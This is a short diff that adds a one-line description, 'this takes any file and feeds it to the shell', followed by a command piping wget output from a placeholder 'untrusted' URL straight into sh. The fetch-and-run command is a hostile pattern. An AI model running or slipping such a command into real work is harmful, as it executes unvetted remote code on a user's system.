@@ -1,0 +1,4 @@
+
+this takes any file and feeds it to the shell
+
+wget http://an-untrusted-url -O- | sh
